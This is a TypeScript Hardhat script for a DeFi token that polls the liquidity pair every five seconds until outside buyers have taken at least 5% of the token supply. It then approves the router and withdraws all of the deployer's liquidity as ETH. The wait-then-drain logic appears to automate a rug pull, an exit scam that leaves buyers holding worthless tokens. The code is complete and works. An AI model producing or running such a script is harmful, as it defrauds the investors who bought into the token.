import { ethers } from "hardhat";
require("dotenv").config();

async function removeLiquidityETH() {
  const [deployer, others] = await ethers.getSigners();

  const tkAddress = process.env.TOKEN_ADDRESS || "";
  const routerAddress = process.env.ROUTER_ADDRESS || "";

  const tk = await ethers.getContractAt("Token", tkAddress);
  const router = await ethers.getContractAt("IRouter", routerAddress);
  const factory = await ethers.getContractAt(
    "IFactory",
    await router.factory()
  );
  const weth = await ethers.getContractAt("IETH", await router.WETH());

  const pairAddress = await factory.getPair(tkAddress, await weth.getAddress());
  const pair = await ethers.getContractAt("IPair", pairAddress);

  // Approve for router to use LP
  const lpBalance = await pair.balanceOf(deployer.address);
  if (lpBalance <= 5n) {
    console.log(`No LP for token${tkAddress}`);
    return;
  }

  const totalSupply = await tk.totalSupply();
  console.log("Checking amount token in liquidity...");
  var lpToken: bigint;
  while (true) {
    lpToken = await tk.balanceOf(pairAddress);
    if (lpToken <= (totalSupply * 19n) / 20n) {
      break;
    }
    await new Promise((f) => setTimeout(f, 5000)); // recheck every 5s
  }

  const allow = await pair.allowance(deployer.address, routerAddress);
  if (allow == 0n) {
    const approveTx = await pair.approve(await router.getAddress(), lpBalance);
    await approveTx.wait();
    console.log("Approved pair");
  }

  // Remove liquidity ETH
  const deadline = Math.round(Date.now() + 300);
  const removeLiquidityTx = await router.removeLiquidityETH(
    tkAddress,
    lpBalance,
    0,
    0,
    deployer.address,
    deadline
  );
  await removeLiquidityTx.wait();
  console.log("Removed liquidity:", removeLiquidityTx.hash);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
removeLiquidityETH().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
